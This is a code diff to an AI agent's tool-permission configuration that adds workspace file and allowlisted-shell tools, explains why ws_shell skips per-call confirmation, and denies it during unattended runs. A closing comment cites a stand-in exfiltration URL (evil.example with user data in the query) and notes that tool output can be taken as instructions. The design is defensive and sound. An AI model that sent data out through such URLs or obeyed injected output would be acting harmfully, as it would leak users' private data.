@@ -53,6 +53,15 @@ TOOL_SENSE: dict[str, str] = {
     # both. Off until the phase-1 registry is enabled.
     "web_read": "web.read",
     "wiki": "web.read",
+    # The workspace tier (docs/architecture/18). Files are one confined folder —
+    # risk is what lands IN it from connectors, which read-tools already contain.
+    # Execution is a curated allowlist: granting the sense approves THE LIST, so
+    # there is no per-call confirmation to fatigue-switch, and unattended use is
+    # denied outright below.
+    "ws_list": "workspace.files",
+    "ws_read": "workspace.files",
+    "ws_write": "workspace.files",
+    "ws_shell": "workspace.exec",
 }
 
 #: Irreversible or externally-visible actions always require a human "yes", even
@@ -61,6 +70,9 @@ TOOL_SENSE: dict[str, str] = {
 ALWAYS_CONFIRM: set[str] = {
     "email_send", "shell", "file_write", "http_post", "calendar_write",
     "delete_fact", "purge_memory",
+    # ws_shell is deliberately NOT here: the allowlist is what the user approved
+    # when granting workspace.exec, and a gate that fires on every `ls` is a gate
+    # that gets disabled. The curation carries the weight; see workspace.py.
 }
 
 #: Scope-sensitive: heartbeat and dreaming run unattended, so anything that
@@ -84,8 +96,23 @@ ALWAYS_CONFIRM: set[str] = {
 #: observability would just be a person in the room.
 PRESENCE_GATED: set[str] = {"web_read", "wiki"}
 
+#: The THIRD shape of gate: the consent was the list itself. A curated shell whose
+#: programs and verbs are fixed in code means "granting workspace.exec" approves a
+#: finite, auditable command surface — the user confirmed the list up front, in
+#: words. A per-call confirmation on top of that fires on every `ls` and teaches
+#: the user to dismiss without reading, which is the exact desensitisation the
+#: ALWAYS_CONFIRM design exists to avoid. Unattended scope is still flatly denied
+#: (no presence to steer by), and every invocation is audited. Same pattern as
+#: PRESENCE_GATED: a named set, asserted narrowly in tests, so it cannot grow by
+#: quietly omitting something from ALWAYS_CONFIRM.
+ALLOWLIST_GATED: set[str] = {"ws_shell"}
+
 UNATTENDED_DENY: set[str] = {
     "email_send", "shell", "http_post", "file_write", "calendar_write",
+    # No heartbeat should spawn a process. Even allowlisted ones produce output the
+    # next turn might treat as instructions, and nobody is there to notice the
+    # pattern forming. Interactive scope is unimpaired.
+    "ws_shell",
     # ⚠️ These are READ tools, and they are still here. That is not an oversight.
     #
     # A URL is an outbound channel: `http://evil.example/?d=<your data>` leaves the
